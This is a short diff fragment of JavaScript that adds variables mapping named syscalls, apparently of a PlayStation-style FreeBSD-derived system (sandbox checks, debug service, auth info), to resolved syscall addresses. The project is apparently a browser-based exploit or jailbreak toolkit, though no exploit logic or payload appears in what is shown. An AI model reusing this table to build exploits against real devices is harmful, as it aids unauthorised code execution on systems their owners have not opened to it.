+var dynlib_get_proc_param_addr = sys_598_addr;
+var fcntl_addr = sys_92_addr;
+var getppid_addr = sys_39_addr;
+var readv_addr = sys_120_addr;
+var rdup_addr = sys_603_addr;
+var listen_addr = sys_106_addr;
+var app_state_change_addr = sys_648_addr;
+var set_gpo_addr = sys_617_addr;
+var ksem_unlink_addr = sys_406_addr;
+var get_cpu_usage_proc_addr = sys_641_addr;
+var shm_unlink_addr = sys_483_addr;
+var reserve_2mb_page_addr = sys_675_addr;
+var dynlib_get_info2_addr = sys_660_addr;
+var mlock_addr = sys_203_addr;
+var workaround8849_addr = sys_605_addr;
+var get_sdk_compiled_version_addr = sys_647_addr;
+var clock_settime_addr = sys_233_addr;
+var ksem_destroy_addr = sys_408_addr;
+var ksem_open_addr = sys_405_addr;
+var thr_set_ucontext_addr = sys_635_addr;
+var get_bio_usage_all_addr = sys_667_addr;
+var getdtablesize_addr = sys_89_addr;
+var chflags_addr = sys_34_addr;
+var shm_open_addr = sys_482_addr;
+var eport_close_addr = sys_584_addr;
+var dynlib_get_list2_addr = sys_659_addr;
+var socketclose_addr = sys_114_addr;
+var sched_getscheduler_addr = sys_330_addr;
+var pathconf_addr = sys_191_addr;
+var localtime_to_utc_addr = sys_639_addr;
+var setpriority_addr = sys_96_addr;
+var cpumode_yield_addr = sys_676_addr;
+var process_terminate_addr = sys_652_addr;
+var ioctl_addr = sys_54_addr;
+var opmc_get_hw_addr = sys_626_addr;
+var eport_create_addr = sys_580_addr;
+var socket_addr = sys_97_addr;
+var _umtx_lock_addr = sys_434_addr;
+var thr_suspend_addr = sys_442_addr;
+var is_in_sandbox_addr = sys_585_addr;
+var get_authinfo_addr = sys_587_addr;
+var mdbg_service_addr = sys_601_addr;
+var getsockopt_addr = sys_118_addr;
+var get_paging_stats_of_all_threads_addr = sys_611_addr;
+var adjtime_addr = sys_140_addr;
+var kqueueex_addr = sys_141_addr;
+var uuidgen_addr = sys_392_addr;
+var set_vm_container_addr = sys_559_addr;
+var sendto_addr = sys_133_addr;
